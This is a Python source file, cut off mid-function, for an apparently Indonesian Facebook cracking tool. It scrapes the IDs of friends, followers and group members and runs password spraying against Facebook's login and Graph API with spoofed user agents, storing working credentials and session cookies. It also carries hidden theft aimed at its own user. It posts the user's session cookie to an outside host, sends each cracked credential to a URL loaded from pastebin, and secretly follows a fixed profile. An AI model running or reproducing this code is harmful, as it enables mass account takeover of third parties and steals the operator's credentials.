import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.devilmaycrry.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt");os.remove(".tok.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀DMC⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣸⠀⣠⣄⡀⠀⣀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢨⣿⣿⣿⣿⣿⠀⠀⢀⡰⠡⣾⣿⣿⡇⠰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣸⣿⣿⣿⣿⣿⣆⠘⣥⣄⠀⠘⠋⠉⣴⣶⠉⢉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡯⡿⢿⣿⣿⣿⣿⣿⣦⣯⠉⢹⣿⡆⠀⠉⠉⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡔⢸⣁⡇⢸⢸⣿⣿⣿⣿⣿⣿⠀⠀⠻⠿⠿⠷⠷⣿⣿⣿⣿⣿⣿⣿⡿⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⢣⣸⢸⢇⡏⣸⣿⣿⣿⣿⣿⣿⣿⠶⠤⠤⣄⠀⢀⣸⣿⣿⣿⣿⣿⣿⣿⣉⠲⢮⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢿⣟⣿⣼⣿⣿⣿⣿⣿⣿⣿⠯⠭⠥⢦⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢉⣿⠀⠈⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⡟⠚⡿⠿⣿⣿⣿⡿⣻⣿⠥⣤⣶⡶⢿⣭⣛⢿⣿⣿⣿⣿⣿⣿⣷⣶⡏⠀⣆⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠀⡾⣷⠖⠒⡖⢿⣿⡿⠟⠛⠛⣉⡟⠛⠙⢯⠽⢿⣞⠙⡟⠛⠚⢿⣿⡿⠲⠿⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⠀⢸⢀⡞⣷⣈⠻⢿⣶⣶⣶⣾⣷⣄⠀⣼⣷⣿⡿⣿⢧⡀⠀⣼⣿⣷⣄⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢠⡏⣸⣷⡘⠿⣷⣶⣤⣤⣤⣤⡴⢿⡄⠘⣿⣿⣶⡿⢆⣳⡄⠘⣿⣿⡇⢱⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢰⣾⣷⣿⡙⢿⣶⣤⣈⣉⣉⣉⣡⣴⣾⣄⠀⢹⣶⣭⣥⣿⢿⣿⣆⠈⢿⣇⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣯⠳⣤⡉⠛⠻⠿⠿⠿⠿⠛⣡⣿⡀⠘⣮⣙⣛⣋⣼⣿⣿⣦⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⠛⠷⣶⣤⣤⣴⣶⠿⠛⣡⡇⠘⣮⡻⢿⣿⡿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣀⣤⣴⣾⣿⣿⣶⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  

         {N}[ RAMADAN MUBARAK ]
      [ Created By DMC-HACKER ]""")

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        try:
            cok = input("[?] cookie : ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: anda sedang menggunakan mode free facebook")
                print("[-] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                self.ubah_bahasa({"cookie": cok})
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[-] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie yang anda masukan invalid");time.sleep(2);self.login_cokie()
            else:
                print("\n[-] Mohon tunggu sebentar...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('.cok.txt', 'w').write(cok);open('.tok.txt', 'w').write(f"{nama}|{user}")
                print(f"[✓] selamat datang {nama} di ASU Toolkit");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!] jalankan ulang perintah nya dengan ketik python regex.py")
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open(".cok.txt", "r").read()}
            nama, user = open(".tok.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        self.jnckk()
        print(f"""

[+] yuor name   : {O}{nama}{N}
[+] id facebook : {O}{user}{N}""")
        print("""
  %s{%s01%s} search name
  %s{%s02%s} crack frinds
  %s{%s03%s} crack followers
  %s{%s04%s} crack member grup
  %s{%s05%s} check crack results
  %s{%s06%s} get proxy server list
  %s{%s00%s} logout tools ASU Toolkit
"""%(
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N
))
        ykh = input(f"{H}[{M}+{H}]{N} @DMC_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} @DMC_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass
#https://pastebin.com/raw/mi4nGb0K
#https://pastebin.com/raw/FRn3fBGN
    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @DMC_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @DMC_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                else:
                    continue

    def carckk(self, kntd):
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:
                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        if "iya" in self.iya:
                            for x in self.pasw:
                                pwx.append(x)
                        if "api" in kntd:
                            bool.submit(self.apiiiiii, uid, pwx)
                        elif "acy" in kntd:
                            bool.submit(self.regguler, uid, pwx)
                        elif "dat" in kntd:
                            bool.submit(self.validate, uid, pwx)
                        else:bool.submit(self.regguler, uid, pwx)
                    except:pass
            exit("\n\ncracking done!")

    def ua_acy(self):
        versi_android = str(random.randint(4,12))+".0.0"
        versi_app = random.randint(100000000,900000000)
        versi_chrome = str(random.randint(200,299))+".0.0."+str(random.randint(1,29))+"."+str(random.randint(40,200))
        versi_fbpn = random.choice(["com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.katana","com.facebook.mlite"])
        vivo1 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{versi_chrome};FBPN/{versi_fbpn};FBLC/en_US;FBBV/{versi_app};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
        vivo2 = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,12))}; vivo 1920 Build/RP1A.{str(random.randint(111111,299999))}.012)"
        rmx = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,13))}; RMX3572 Build/TP1A.{str(random.randint(200000,900000))}.001)"
        vivo_main = str(random.choice([vivo1, vivo2, rmx]))
        return vivo_main

    def ua_api(self):
        az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
        builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
        chrome3 = str(random.randint(100, 300))
        chrome4 = str(random.randint(1000, 9000))
        ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
        return ngentod

    def apiiiiii(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_api()
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r[ {H}LIVE{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r[ {K}CHEK{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

    def regguler(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_acy()
                link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
                data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": username,
                    "prefill_contact_point": f"{username} {password}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                }
                head = {"Host": "m.facebook.com", "content-length": f"{str(len(data))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
